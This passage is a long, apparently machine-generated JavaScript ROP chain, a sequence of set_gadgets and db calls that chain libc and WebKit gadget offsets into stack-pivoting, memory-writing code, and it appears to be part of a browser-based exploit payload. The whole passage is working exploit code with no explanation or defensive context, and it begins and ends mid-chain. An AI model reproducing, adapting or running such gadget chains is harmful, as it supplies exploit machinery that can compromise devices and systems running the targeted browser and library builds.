libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127456, //L1628
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1628:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1630:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+127576, //L1633
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127560, //L1631
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1631:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1633:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127720, //L1636
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127688, //L1634
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127704, //L1635
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1634:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1635:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1636:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127792, //L1637
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1637:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127848, //L1639
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1639:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127928, //L1643
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1643:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1641:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1642:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+128032, //L1644
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+128048, //L1645
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1644:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+128136, //L1646
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1646:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128192, //L1648
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1648:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128264, //L1650
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1650:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128320, //L1652
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1652:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1654:
libc_base+785097, //mov rsp, rbp ; pop rbp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128456, //L1655
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1655:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1657:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+128576, //L1660
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128560, //L1658
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1658:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1660:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128720, //L1663
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128688, //L1661
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128704, //L1662
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1661:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1662:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1663:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128792, //L1664
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128848, //L1666
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1666:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128928, //L1670
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1670:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1668:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1669:
db([38, 0]); // 0x26
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+129032, //L1671
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129048, //L1672
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1671:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+129136, //L1673
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129192, //L1675
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1675:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129264, //L1677
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1677:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129320, //L1679
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1679:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129448, //L1682
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+129432, //L1681
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1681:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1682:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129544, //L1683
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129560, //L1684
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1683:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129672, //L1685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129656, //L1686
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1686:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1685:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129744, //L1688
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1688:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129832, //L1690
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129864, //L1691
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1690:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1689:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L1691:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1692:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+129976, //L1694
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+129960, //L1693
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1693:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1694:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130056, //L1695
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1695:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1697:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130176, //L1700
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130160, //L1698
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1698:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+130280, //L1701
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130328, //L1704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130312, //L1703
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1701:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1702:
db([12, 0]); // 0xc
set_gadget(libc_base+206806,); //pop rdi
//L1703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130432, //L1707
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130416, //L1705
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1705:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1707:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+130600, //L1710
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130616, //L1711
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130584, //L1708
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130568, //L1709
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1709:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1708:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1710:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+130728, //L1714
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+130712, //L1713
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1712:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+206806,); //pop rdi
//L1713:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130816, //L1715
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1715:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1717:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130936, //L1720
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130920, //L1718
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1718:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1720:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131024, //L1721
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+131040, //L1723
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L1721:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1723:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131096, //L1724
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1724:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1726:
db([12, 0]); // 0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+131272, //L1728
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131288, //L1729
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131256, //L1727
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1727:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1728:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131392, //L1730
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131424, //L1732
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131408, //L1731
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1730:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1731:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+131592, //L1734
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131608, //L1735
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131576, //L1733
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1733:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1734:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1735:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131712, //L1737
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131776, //L1741
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131760, //L1740
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1737:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1738:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1739:
db([1, 0]); // 0x1
set_gadget(libc_base+206806,); //pop rdi
//L1740:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1741:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+131896, //L1742+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+131888, //L1742
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1742:
db([0, 0]); // 0x0
set_gadgets([
ropchain+131912, //L1742+24
ropchain+136032, //L1736
libc_base+793877, //pop rsi
ropchain+131952, //L1743
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1743:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1745:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132072, //L1748
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132056, //L1746
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1746:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+132176, //L1749
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132224, //L1752
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132208, //L1751
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1749:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1750:
db([36, 0]); // 0x24
set_gadget(libc_base+206806,); //pop rdi
//L1751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1752:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132328, //L1755
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132312, //L1753
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1753:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1755:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+132496, //L1758
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132512, //L1759
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132480, //L1756
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132464, //L1757
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1757:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1756:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1758:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132584, //L1760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132600, //L1761
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1761:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132696, //L1763
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+132680, //L1762
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1762:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1763:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+132776, //L1764
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1764:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1766:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132896, //L1769
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132880, //L1767
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1767:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1769:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+133000, //L1770
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133048, //L1773
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133032, //L1772
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1770:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1771:
db([12, 0]); // 0xc
set_gadget(libc_base+206806,); //pop rdi
//L1772:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+133152, //L1776
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133136, //L1774
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1774:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1776:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+133320, //L1779
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133336, //L1780
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133304, //L1777
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133288, //L1778
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1778:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1777:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1779:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1780:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133408, //L1781
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133424, //L1782
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1781:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133528, //L1783
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133560, //L1785
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133544, //L1784
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1783:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1784:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1785:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
